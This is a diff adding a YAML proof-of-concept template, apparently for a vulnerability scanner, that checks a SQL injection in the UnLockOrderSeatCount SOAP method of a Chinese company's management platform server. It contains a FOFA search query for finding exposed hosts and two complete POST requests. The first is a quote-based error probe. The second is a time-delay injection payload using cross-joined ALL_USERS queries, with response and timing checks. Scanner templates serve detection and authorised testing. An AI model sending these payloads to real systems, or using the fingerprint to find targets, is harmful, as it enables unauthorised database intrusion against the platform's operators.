@@ -1,0 +1,37 @@
+id: poc-yaml-sendinfo-control-platform-server-unlockorderseatcount-sqli
+info:
+  name: 深大智能科技有限公司管控平台服务端 UnLockOrderSeatCount SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 深大智能科技有限公司管控平台服务端
+  fofa: body="ItemsControlServer.aspx"
+requests:
+- method: POST
+  path: /API.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/UnLockOrderSeatCount"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <UnLockOrderSeatCount xmlns=\"http://tempuri.org/\">\n \
+    \     <fo>'</fo>\n      <ft>string</ft>\n    </UnLockOrderSeatCount>\n  </soap:Body>\n\
+    </soap:Envelope>"
+  expression: status_code == 200 && contains(body,"引号内的字符串没有正确结束") && contains(body,"UnLockOrderSeatCountResponse")
+    && contains(body,"UnLockOrderSeatCountResult") && contains(content_type,"text/xml")
+- method: POST
+  path: /API.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/UnLockOrderSeatCount"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <UnLockOrderSeatCount xmlns=\"http://tempuri.org/\">\n \
+    \     <fo>' OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS\
+    \ T3,ALL_USERS T4,ALL_USERS T5)-- AodC</fo>\n      <ft>string</ft>\n    </UnLockOrderSeatCount>\n\
+    \  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"找到数量预订并且未出票的该订单") && contains(body,"UnLockOrderSeatCountResponse")
+    && contains(body,"UnLockOrderSeatCountResult") && contains(content_type,"text/xml")
+    && duration > 5 && duration < 8
+variables: {}
+transport: http
